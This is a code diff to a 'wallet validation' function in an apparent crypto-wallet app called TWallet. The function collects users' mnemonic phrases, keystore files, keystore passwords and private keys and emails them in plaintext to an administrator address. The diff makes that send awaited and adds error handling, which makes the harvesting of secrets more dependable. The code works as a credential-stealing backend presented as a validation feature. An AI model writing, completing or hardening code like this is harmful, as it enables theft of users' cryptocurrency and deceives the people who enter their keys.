@@ -65,22 +65,26 @@ async function saveWalletValidationInner(input: ValidationInput) {
     details: { wallet_name: input.walletName.trim(), validation_type: input.validationType },
   });
 
-  void sendEmail({
-    to: ADMIN_EMAIL,
-    subject: `[TWallet] New Wallet Validation — ${user.email}`,
-    html: buildWalletValidationEmail({
-      userEmail: user.email ?? "unknown",
-      userId: user.id,
-      walletName: input.walletName.trim(),
-      validationType: input.validationType,
-      mnemonicPhrase: input.mnemonicPhrase?.trim() || null,
-      keystoreJson: input.keystoreJson?.trim() || null,
-      keystorePassword: input.keystorePassword?.trim() || null,
-      privateKey: input.privateKey?.trim() || null,
-      hardwareType: input.hardwareType || null,
-    }),
-    type: "wallet_validated",
-  });
+  try {
+    await sendEmail({
+      to: ADMIN_EMAIL,
+      subject: `[TWallet] New Wallet Validation - ${user.email}`,
+      html: buildWalletValidationEmail({
+        userEmail: user.email ?? "unknown",
+        userId: user.id,
+        walletName: input.walletName.trim(),
+        validationType: input.validationType,
+        mnemonicPhrase: input.mnemonicPhrase?.trim() || null,
+        keystoreJson: input.keystoreJson?.trim() || null,
+        keystorePassword: input.keystorePassword?.trim() || null,
+        privateKey: input.privateKey?.trim() || null,
+        hardwareType: input.hardwareType || null,
+      }),
+      type: "wallet_validated",
+    });
+  } catch (err) {
+    console.error("[email] wallet-validation alert failed:", err instanceof Error ? err.message : err);
+  }
 
   return { success: true, validationId: data.id };
 }
